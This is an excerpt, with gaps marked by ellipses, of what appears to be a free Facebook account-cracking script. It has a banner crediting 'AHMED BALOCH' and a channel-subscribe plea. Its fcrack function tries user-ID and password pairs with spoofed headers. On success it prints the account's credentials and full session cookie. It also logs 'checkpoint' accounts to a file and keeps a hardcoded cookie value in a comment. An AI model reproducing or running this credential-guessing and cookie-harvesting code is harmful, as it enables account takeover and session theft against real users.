...
import os
print ("First subscribe my YT CHANNEL")
...
\33[1;32m `Y88P'   88      88       `Y88P'       YP       d8'    
                              
\33[1;37m note=ids open only with cookies                                         
===================🚫🚫=================================
[➿] OWNER      : \033[1;32m AHMED BALOCH xd
[➿] GITHUB     :  \033[1;33m **private
[➿] STATUS     :  \033[1;34m FREE 
[➿] VERXION   : \033[1;35m  1.9 
====================🚫🚫================================
[•]\033[1;31m FREE\033[1;32m FOR \033[1;30mALL  \033[1;37mMY   \033[1;34mBROTHERS
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=cikWZh1HbhmzCRuNHswNk5p1; sb=cikWZtpQ2tDhCetijqnAexHT; m_pixel_ratio=3; wd=360x648; fr=0WqdR64jd2T8MiRKq..BmFily..AAA.0.0.BmFiml.AWWPRqo_W8g',
    'dpr': '3',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR AHMED-OK⚙️] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍪]\033[0;93m COOKIE = \033[1;37m'+coki+  '  ''  \033[1;97m')
            ...
            #    open('MR AHMED-CP.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHUNTING ⚓\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
